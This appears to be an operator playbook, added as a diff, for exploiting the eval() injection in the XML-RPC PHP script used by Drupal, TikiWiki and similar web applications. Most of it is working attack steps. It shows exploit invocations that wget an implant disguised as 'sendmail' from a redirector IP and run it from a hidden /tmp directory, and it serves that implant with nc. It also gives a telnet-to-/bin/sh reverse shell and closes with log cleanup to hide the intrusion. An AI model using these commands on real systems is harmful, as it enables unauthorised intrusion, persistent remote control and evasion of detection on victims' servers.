@@ -1,0 +1,153 @@
+#######################################
+# EXCELBERWICK
+#######################################
+
+### remote exploit against xmlrpc.php on Unix platforms
+### 
+### WILL REQUIRE  LOCAL ELEVATION
+
+### sybil location: CGI-BIN
+
+### Exploits a vulnerability in the XML-RPC PHP script. The vulnerable 
+### file is used in a large number of web applications, such as Drupal, 
+### b2evolution, and TikiWiki.  The vulnerability is the result of 
+### unsanitized data being passed directly to the eval() call 
+### in the parseRequest() function of the XML-RPC server
+
+### OPSEC:
+### vulnerability: public
+### exploit: public
+
+### Usage:
+#  ./xp_xmlrpc.pl 
+       usage: ./xp_xmlrpc.pl -i<host> -d<dir/file> -c<commands to run>
+
+         -i <host/IP, ex: 127.0.0.1>
+         -d </directory/xmlrpc.php, ex: /drupal/xmlrpc.php>  
+         -p <port, default: 80>
+         -o <turn off IDS mode>
+         -v <for virtual host: default -i>
+         -a <automatically exploit all known scripts. Very noisy.>
+             0: /xmlrpc.php
+             1: /blog/xmlrpc.php
+             2: /blog/xmlsrv/xmlrpc.php
+             3: /blogs/xmlsrv/xmlrpc.php
+             4: /drupal/xmlrpc.php
+             5: /phpgroupware/xmlrpc.php
+             6: /wordpress/xmlrpc.php
+             7: /xmlrpc/xmlrpc.php
+             8: /xmlsrv/xmlrpc.php
+             9: /b2/xmlsrv/xmlrpc.php
+             10: /b2evol/xmlsrv/xmlrpc.php
+             11: /community/xmlrpc.php
+             12: /blogs/xmlrpc.php
+         -c <commands to run>
+
+       Examples:
+       1) ./xp_xmlrpc.pl -i127.0.0.1 -d/drupal/xmlrpc.php -c"uname -a;ls -la;w"
+       2) ./xp_xmlrpc.pl -i127.0.0.1 -d/drupal/xmlrpc.php -c"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://10.1.2.150:5555/sendmail -Osendmail;chmod +x sendmail;D=-c10.1.2.150:9999 PATH=. sendmail) 2>/dev/null"
+
+
+### Check if PHP is there:
+
+# from redirector:
+-scan http TARGET_IP 
+
+# The response should include "PHP/" though the version doesn't necessarily matter
+# Ex. response: Server: Apache/2.0.40 (Red Hat Linux) mod_perl/1.99_05-dev Perl/v5.8.0 mod_auth_pgsql/0.9.12 PHP/4.2.2 mod_python/3.0.0 Python/2.2.1 mod_ssl/2.0.40 OpenSSL/0.9.6b DAV/2 
+
+
+mx
+:%s/TARGET_IP/TARGET_IP/g
+:%s/WEB_PORT/WEB_PORT/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+:%s/REDIR_IP/REDIR_IP/g
+:%s/NOPEN_PORT/NOPEN_PORT/g
+'x
+
+
+
+### Then check if vulnerable by running the "-a" option to exhaust all options
+# WEB-PORT is usually '80' unless the target is using something else, or you
+# choose to tunnel it differently
+
+# redirector:
+-tunnel
+l WEB_PORT TARGET_IP
+
+# local script window:
+./xp_xmlrpc.pl -i127.0.0.1 -pWEB_PORT -a -c"w"
+
+### Look through the output; a successful hit will be followed by
+### the results of the command issued by the "-c" option, in the suggested case,
+### the results of "w'
+### Each unsuccessful version will be followed by "404 not found" errors
+
+### If the previous command yielded a successful attempt, then run the exploit again 
+### but substitute the version that was successful instead of using "-a"
+
+
+### Prepare the appropriate nopen version with an http header:
+# Locally:
+ls -l /current/up/noserver
+file noserver
+echo -e 'HTTP/1.0 200\n' > new
+cat new ../up/morerats/noserver*-i586.pc.linux.gnu.redhat-5.0 > /current/up/sendmail
+
+nc -l -v -p NETCAT_PORT < sendmail
+
+
+# on redirector:
+-nrtun NOPEN_PORT
+
+
+### Replace "VERSION" with the appropriate php script, then run exploit to upload and execute nopen:
+
+
+./xp_xmlrpc.pl -i127.0.0.1 -pWEB_PORT -d"VERSION" -c"mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://REDIR_IP:NETCAT_PORT/sendmail -Osendmail;chmod +x sendmail;D=-cREDIR_IP:NOPEN_PORT PATH=. sendmail) 2>/dev/null"
+
+
+### connect:
+
+-nstun TARGET_IP
+
+###
+### TROUBLESHOOTING:
+###
+
+# Try this to get interactive windows (you'll type in one, and get output in the other):
+
+mx
+:%s/PORT1/PORT1/g
+:%s/PORT2/PORT2/g
+'x
+
+# Local scripted window #1:
+
+nc -l -vv -p PORT1
+
+
+# Local scripted window #2:
+
+nc -l -vv -p PORT2
+
+
+# Local scripted window #3:
+
+./xp_xmlrpc.pl -i127.0.0.1 -pWEB_PORT -d"VERSION" -c"sleep 100 | telnet REDIR_IP PORT1 | /bin/sh | telnet REDIR_IP PORT2"
+
+
+
+
+
+###
+### CLEANUP:
+###
+
+# Logging directory depends on type of web software running on target (check -find):
+# Try /var/log/httpd:
+#		access_log
+#		referer_log
+#		error_log
+
+
